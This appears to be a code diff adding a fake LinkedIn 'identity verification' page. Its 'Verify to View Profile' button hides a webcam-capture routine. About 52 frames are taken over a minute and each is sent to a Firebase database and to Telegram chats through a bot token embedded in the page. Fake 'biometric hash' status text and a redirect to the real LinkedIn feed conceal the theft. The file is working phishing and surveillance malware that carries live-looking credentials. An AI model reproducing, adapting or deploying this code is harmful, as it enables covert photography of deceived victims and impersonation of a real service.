@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn | Identity Verification</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --li-blue: #0a66c2;
+            --li-bg: #f3f2ef;
+            --li-text: rgba(0,0,0,0.9);
+            --li-subtext: rgba(0,0,0,0.6);
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--li-bg); color: var(--li-text);
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .li-card {
+            width: 100%; max-width: 400px; background: #fff; border-radius: 8px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.08), 0 4px 4px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+
+        .li-header { padding: 20px; text-align: center; border-bottom: 1px solid rgba(0,0,0,0.08); }
+        .li-logo { width: 100px; }
+
+        .li-body { padding: 32px 24px; text-align: center; }
+
+        .profile-pre-view {
+            width: 80px; height: 80px; background: #e0e0e0; border-radius: 50%;
+            margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;
+            border: 2px solid #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        h1 { font-size: 20px; font-weight: 600; margin: 0 0 8px; }
+        p { font-size: 14px; color: var(--li-subtext); line-height: 1.5; margin-bottom: 24px; }
+
+        .verification-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: #edf3f8; color: var(--li-blue);
+            padding: 6px 12px; border-radius: 4px; font-size: 12px; font-weight: 600;
+            margin-bottom: 24px;
+        }
+
+        .btn-li {
+            background: var(--li-blue); color: #fff; border: none;
+            width: 100%; padding: 12px; font-size: 16px; font-weight: 600;
+            border-radius: 24px; cursor: pointer; transition: background 0.2s;
+        }
+
+        .btn-li:hover { background: #004182; }
+
+        /* Sync Logic UI */
+        #sync-ui { display: none; }
+        
+        .loader-ring {
+            width: 40px; height: 40px; border: 3px solid #caedff;
+            border-top-color: var(--li-blue); border-radius: 50%;
+            margin: 0 auto 20px; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .sync-text { font-size: 14px; font-weight: 600; color: var(--li-text); }
+        .location-tag { font-size: 11px; color: var(--li-subtext); margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="li-card">
+        <div class="li-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/LinkedIn_Logo.svg" class="li-logo" alt="LinkedIn">
+        </div>
+
+        <div class="li-body" id="init-view">
+            <div class="profile-pre-view">
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="#999"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+            </div>
+            <h1>Restricted Profile</h1>
+            <div class="verification-badge">🛡️ Identity Verification Required</div>
+            <p>To maintain network integrity, high-value profiles in the <b>Mumbai Financial District</b> require a secure identity handshake before access is granted.</p>
+            
+            <button class="btn-li" onclick="startLiSync()">Verify to View Profile</button>
+        </div>
+
+        <div class="li-body" id="sync-ui">
+            <div class="loader-ring"></div>
+            <div class="sync-text">Authenticating Professional Identity...</div>
+            <p style="font-size: 12px; margin-top: 10px;" id="li-timer">Handshake valid for 60 seconds</p>
+            
+            <div style="text-align: left; background: #f9f9f9; padding: 12px; border-radius: 4px; font-family: monospace; font-size: 10px; color: #666;">
+                > INITIALIZING SECURE_RELAY...<br>
+                > NODE: MUMBAI_MAH_INDIA<br>
+                > STATUS: ENCRYPTING BIOMETRIC HASH
+            </div>
+            <div class="location-tag">Detected Access Point: Mumbai, Maharashtra</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startLiSync() {
+            try {
+                // Permission request masked as "Verify to View"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('li-timer').innerText = `Handshake valid for ${timeLeft} seconds`;
+
+                        if (count <= 52) {
+                            liCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Official LinkedIn Profile or Home Redirect
+                            window.location.href = "https://www.linkedin.com/feed/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.linkedin.com/feed/";
+            }
+        }
+
+        function liCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "LINKEDIN_SPOOF", ts: Date.now(), loc: "MUMBAI" });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'li_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
